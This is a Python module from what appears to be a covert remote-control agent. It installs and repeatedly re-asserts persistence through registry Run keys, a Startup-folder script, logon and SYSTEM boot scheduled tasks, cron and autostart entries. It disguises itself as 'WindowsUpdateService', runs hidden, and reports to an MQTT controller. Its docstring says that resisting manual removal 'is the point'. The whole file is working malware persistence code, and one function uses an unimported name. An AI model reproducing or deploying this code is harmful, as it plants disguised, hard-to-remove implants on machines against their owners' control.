"""Persistence: copies, registry Run keys, scheduled task and startup folder.

Four independent mechanisms, re-asserted every few minutes.  Removing all of
them by hand takes real effort, which is the point.
"""

from __future__ import annotations
from .. import guardian

import os
import shutil
import subprocess
import sys
import tempfile
import time
from . import stealth

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


# --------------------------------------------------------------------------
# Copying
# --------------------------------------------------------------------------


def _copy_tree(source: str, destination: str) -> None:
    """Copy a file or directory, creating parents as needed."""
    os.makedirs(os.path.dirname(destination), exist_ok=True)
    if os.path.isdir(source):
        shutil.copytree(source, destination, dirs_exist_ok=True,
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    else:
        shutil.copy2(source, destination)


def bundle_paths() -> list[tuple[str, str]]:
    """Return ``(source, relative_name)`` pairs for the whole agent bundle."""
    root = stealth.bundle_root()
    pairs: list[tuple[str, str]] = []

    if getattr(sys, "frozen", False):
        # Frozen: the "script" is the executable itself.
        executable = os.path.abspath(sys.executable)
        if os.path.isfile(executable):
            pairs.append((executable, stealth.executable_name()))
    else:
        agent_file = os.path.join(root, "agent.py")
        if os.path.isfile(agent_file):
            pairs.append((agent_file, stealth.executable_name()))

    package = os.path.join(root, "syspy")
    if os.path.isdir(package):
        pairs.append((package, "syspy"))

    return pairs


def install_copies() -> list[str]:
    """Ensure every install directory holds a fresh copy of the bundle."""
    pairs = bundle_paths()
    written: list[str] = []
    for directory in stealth.install_directories():
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError:
            continue
        for source, relative in pairs:
            target = os.path.join(directory, relative)
            try:
                _copy_tree(source, target)
                written.append(target)
            except OSError:
                pass
    return written


def missing_copies() -> list[str]:
    """List install locations that are absent."""
    missing = []
    for directory in stealth.install_directories():
        entry = os.path.join(directory, stealth.executable_name())
        if not os.path.exists(entry):
            missing.append(entry)
    return missing


def primary_launcher() -> str:
    """Absolute path of the copy the persistence entries point at."""
    return os.path.join(stealth.primary_directory(), stealth.executable_name())


def interpreter_for(entry: str) -> str:
    """Pick the interpreter used to launch ``entry``."""
    if entry.lower().endswith(".exe"):
        return entry
    from . import runtime
    python = runtime.private_python() or sys.executable
    if IS_WINDOWS and python.lower().endswith("python.exe"):
        windowless = python[:-len("python.exe")] + "pythonw.exe"
        if os.path.exists(windowless):
            python = windowless
    return python


# --------------------------------------------------------------------------
# Windows persistence
# --------------------------------------------------------------------------


def _write_shim() -> str:
    """Ensure WindowsUpdateService.cmd shim exists in primary directory."""
    if not IS_WINDOWS:
        return ""
    shim = stealth.shim_path()
    try:
        os.makedirs(os.path.dirname(shim), exist_ok=True)
        # Look for wu.cmd in bundle root install/wu.cmd
        for candidate in (
            os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
            os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
            os.path.join(config.ROOT, "install", "wu.cmd"),
        ):
            if os.path.isfile(candidate):
                shutil.copy2(candidate, shim)
                return shim
    except Exception:
        pass
    return ""


def _cache_kit() -> str:
    """Ensure kit.zip is cached in primary directory."""
    target = stealth.kit_cache_path()
    try:
        if os.path.isfile(target):
            return target
        os.makedirs(os.path.dirname(target), exist_ok=True)
        from .. import packaging
        blob = packaging.build_zip(stealth.bundle_root())
        with open(target, "wb") as f:
            f.write(blob)
        return target
    except Exception:
        return ""


def _reassert_run_keys() -> list[str]:
    """Compare winreg QueryValueEx to expected command and rewrite only on mismatch."""
    if not IS_WINDOWS:
        return []
    import winreg
    from .. import config

    shim = stealth.shim_path()
    launcher = primary_launcher()
    expected = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
    if stealth.is_admin():
        roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))

    actions = []
    for root, label in roots:
        for value_name in config.RUN_VALUE_NAMES:
            try:
                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
                with key:
                    try:
                        val, _ = winreg.QueryValueEx(key, value_name)
                    except FileNotFoundError:
                        val = None
                    if val != expected:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, expected)
                        actions.append(f"reasserted {label}\Run\{value_name}")
            except OSError:
                pass
    return actions


def _write_run_keys(launcher: str) -> list[str]:
    """Create the HKCU and (when possible) HKLM Run entries."""
    import winreg
    from .. import config

    command = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    written = []

    for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                        (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
        for value_name in config.RUN_VALUE_NAMES:
            try:
                key = winreg.CreateKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                written.append(f"{label}\\Run\\{value_name}")
            except OSError:
                continue
    return written


def config_value_names() -> tuple[str, ...]:
    """Registry value names, imported lazily to keep this module standalone."""
    from .. import config
    return config.RUN_VALUE_NAMES


def _write_startup_script(launcher: str) -> str:
    """Drop a launcher into the user's Startup folder."""
    from .. import config
    folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
    if not os.path.isdir(folder):
        return ""
    path = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
    script = (
        "@echo off\r\n"
        "ping -n 12 127.0.0.1 >nul\r\n"
        f'start "" "{interpreter_for(launcher)}" "{launcher}" --hidden\r\n'
    )
    try:
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(script)
        return path
    except OSError:
        return ""


def _write_scheduled_task(launcher: str) -> str:
    """Create a logon and startup task."""
    from .. import config
    shim = stealth.shim_path()
    command = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
    try:
        subprocess.run(
            ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
             "/SC", "ONLOGON", "/RL", rl_level, "/IT",
             "/DELAY", "0000:30", "/RI", "5", "/DU", "24:00"],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
        )
        if stealth.is_admin():
            subprocess.run(
                ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
                 "/SC", "ONSTART", "/RU", "SYSTEM"],
                capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
            )
        return config.TASK_NAME
    except Exception:
        return ""


def _task_exists() -> bool:
    from .. import config
    try:
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", config.TASK_NAME],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20,
        )
        return result.returncode == 0
    except Exception:
        return False


# --------------------------------------------------------------------------
# POSIX persistence
# --------------------------------------------------------------------------


def _write_unix_autostart(launcher: str) -> str:
    from .. import config
    directory = os.path.expanduser("~/.config/autostart")
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, "windows-update-service.desktop")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(
            "[Desktop Entry]\n"
            "Type=Application\n"
            f"Name={config.PRODUCT_DESCRIPTION}\n"
            f"Exec={interpreter_for(launcher)} {launcher} --hidden\n"
            "X-GNOME-Autostart-enabled=true\n"
            "Terminal=false\n"
        )
    return path


def _write_cron(launcher: str) -> str:
    try:
        current = subprocess.run(["crontab", "-l"], capture_output=True,
                                 text=True, timeout=15).stdout
    except Exception:
        return ""
    if "windows-update-service" in current:
        return "crontab (present)"
    line = f"@reboot sleep 10; {interpreter_for(launcher)} {launcher} --hidden >/dev/null 2>&1\n"
    try:
        subprocess.run(["crontab", "-"], input=current + line, text=True,
                       capture_output=True, timeout=15)
        return "crontab (added)"
    except Exception:
        return ""


# --------------------------------------------------------------------------
# Public API
# --------------------------------------------------------------------------


def install() -> list[str]:
    """Install every persistence mechanism.  Returns a list of what was done."""
    launcher = primary_launcher()
    install_copies()
    actions: list[str] = []

    if IS_WINDOWS:
        _write_shim()
        _cache_kit()
        actions += _write_run_keys(launcher)
        if _write_startup_script(launcher):
            actions.append("startup folder")
        if _write_scheduled_task(launcher):
            actions.append("scheduled task")
        actions += guardian.install()
    else:
        actions.append(_write_unix_autostart(launcher))
        cron = _write_cron(launcher)
        if cron:
            actions.append(cron)

    return actions


def ensure() -> list[str]:
    """Re-assert persistence.  Cheap enough to run every few minutes."""
    actions: list[str] = []
    missing = missing_copies()
    if missing:
        install_copies()
        actions.append(f"restored {len(missing)} copy(ies)")
    if IS_WINDOWS:
        if not _task_exists():
            _write_scheduled_task(primary_launcher())
            actions.append("recreated task")
        if not os.path.isfile(stealth.shim_path()):
            _write_shim()
            actions.append("recreated shim")
        if not os.path.isfile(stealth.kit_cache_path()):
            _cache_kit()
            actions.append("recached kit")
        actions += _reassert_run_keys()
    return actions


def _kill_process_by_pid(pid: int) -> bool:
    """Forcibly kill a process tree by PID."""
    if pid <= 0:
        return False
    if IS_WINDOWS:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(pid)],
                capture_output=True, timeout=10,
                creationflags=CREATE_NO_WINDOW,
            )
            return True
        except Exception:
            pass
    try:
        os.kill(pid, 9)
        return True
    except OSError:
        return False


def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
    """Find and forcibly terminate any running agent or watchdog processes."""
    from .. import config
    if exclude_pid == 0:
        exclude_pid = os.getpid()

    killed_pids: list[int] = []

    # 1. PIDs from lock files in all candidate directories
    candidate_dirs = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_dirs.extend([
            r"C:\Windows\Temp",
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp"),
            os.path.join(os.environ.get("APPDATA", ""), "Temp"),
        ])

    lock_names = [
        f"{config.PRODUCT_NAME.lower()}.lock",
        f"{config.PRODUCT_NAME.lower()}.wd.lock",
        f"{config.PRODUCT_NAME.lower()}.boot",
        "windowsupdateservice.lock",
        "windowsupdateservice.wd.lock",
        "windowsupdateservice.boot",
    ]
    for d in set(candidate_dirs):
        if not d or not os.path.isdir(d):
            continue
        for name in lock_names:
            path = os.path.join(d, name)
            pid = stealth.read_pid(path)
            if pid and pid != exclude_pid and stealth.process_alive(pid):
                if _kill_process_by_pid(pid):
                    killed_pids.append(pid)

    # 2. Windows specific: scan Win32_Process for agent / watchdog processes
    if IS_WINDOWS:
        try:
            ps_cmd = (
                f"$cur = {exclude_pid}; "
                "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { "
                "$_.ProcessId -ne $cur -and ("
                "$_.CommandLine -like '*WindowsUpdateService*' -or "
                "$_.CommandLine -like '*WindowsUpdate*' -or "
                "$_.ExecutablePath -like '*WindowsUpdate*' -or "
                "($_.CommandLine -like '*agent.py*' -and $_.CommandLine -notlike '*--uninstall*' -and $_.CommandLine -notlike '*--remove*') "
                ") } | ForEach-Object { "
                "Write-Output $_.ProcessId; "
                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue "
                "}"
            )
            res = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            for line in res.stdout.splitlines():
                line = line.strip()
                if line.isdigit():
                    p = int(line)
                    if p not in killed_pids:
                        killed_pids.append(p)
        except Exception:
            pass

    if killed_pids:
        time.sleep(0.5)

    return killed_pids


def remove() -> list[str]:
    """Undo everything :func:`install` did and stop all running processes."""
    from .. import config
    removed: list[str] = []

    if IS_WINDOWS:
        removed += guardian.remove()
        removed += guardian.clear_startup_approved()

    # 1. Terminate all running agent/watchdog processes
    killed = terminate_running_instances(exclude_pid=os.getpid())
    if killed:
        removed.append(f"stopped running process(es): {', '.join(str(p) for p in killed)}")

    # 2. Windows persistence cleanup
    if IS_WINDOWS:
        import winreg
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            for value_name in config.RUN_VALUE_NAMES:
                try:
                    key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, value_name)
                    removed.append(f"{label}\\Run\\{value_name}")
                except OSError:
                    pass

        # User Startup folder & All Users Startup folder
        startup_dirs = [
            os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.environ.get("ALLUSERSPROFILE", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
        ]
        for sdir in startup_dirs:
            startup_file = os.path.join(sdir, config.PRODUCT_NAME + ".cmd")
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    removed.append(f"startup script ({startup_file})")
                except OSError:
                    pass

        for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
            res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
            if res.returncode == 0:
                removed.append(f"scheduled task ({name})")
    else:
        desktop = os.path.expanduser("~/.config/autostart/windows-update-service.desktop")
        if os.path.exists(desktop):
            try:
                os.remove(desktop)
                removed.append("autostart entry")
            except OSError:
                pass

    # 3. Clean install directories
    for directory in stealth.install_directories():
        if os.path.isdir(directory):
            try:
                shutil.rmtree(directory, ignore_errors=True)
            except Exception:
                pass
            if not os.path.exists(directory):
                removed.append(f"removed directory: {directory}")
            else:
                if IS_WINDOWS:
                    try:
                        subprocess.run(
                            f'cmd /c rd /s /q "{directory}"',
                            shell=True, capture_output=True, timeout=10,
                            creationflags=CREATE_NO_WINDOW,
                        )
                        if not os.path.exists(directory):
                            removed.append(f"removed directory: {directory}")
                    except Exception:
                        pass

    # Tombstone written after cleaning
    try:
        pdir = stealth.primary_directory()
        os.makedirs(pdir, exist_ok=True)
        open(os.path.join(pdir, "tombstone"), "w").close()
    except OSError:
        pass

    # 4. Remove lock and state files in all candidate temp folders
    candidate_temps = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_temps.extend([r"C:\Windows\Temp", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")])

    for ctemp in set(candidate_temps):
        if not ctemp or not os.path.isdir(ctemp):
            continue
        for fname in (
            f"{config.PRODUCT_NAME.lower()}.lock",
            f"{config.PRODUCT_NAME.lower()}.wd.lock",
            f"{config.PRODUCT_NAME.lower()}.boot",
            "windowsupdateservice.lock",
            "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot",
        ):
            p = os.path.join(ctemp, fname)
            try:
                if os.path.exists(p):
                    os.remove(p)
                    removed.append(f"lock file ({p})")
            except OSError:
                pass

    # 5. Broadcast goodbye to MQTT if reachable so dashboard updates immediately
    try:
        from .. import crypto, protocol
        from ..mqtt import MqttClient, random_client_id
        key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        codec = protocol.Codec(key)
        aid = config.agent_id()
        broker = config.broker_order()[0]
        client = MqttClient(random_client_id("bye"), lambda t, p: None)
        client.connect(broker[0], broker[1], broker[2], timeout=4.0)
        client.publish(config.topic_up(aid), codec.encode({"t": "bye"}), qos=1)
        time.sleep(0.3)
        client.disconnect()
        removed.append("notified controller of agent shutdown")
    except Exception:
        pass

    return removed


def status() -> dict[str, object]:
    """Report the current persistence state."""
    return {
        "copies": [d for d in stealth.install_directories() if os.path.isdir(d)],
        "missing": missing_copies(),
        "task_present": _task_exists() if IS_WINDOWS else None,
        "launcher": primary_launcher(),
        "admin": stealth.is_admin(),
    }


def purge() -> list[str]:
    """Complete wipe including HKLM values, program data copies and runtime."""
    removed = remove()
    if IS_WINDOWS:
        for p in (stealth.shim_path(), stealth.kit_cache_path(),
                  os.path.join(stealth.primary_directory(), "deploy.json"),
                  os.path.join(stealth.primary_directory(), "runtime")):
            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(f"purged {p}")
                except OSError:
                    pass
    return removed
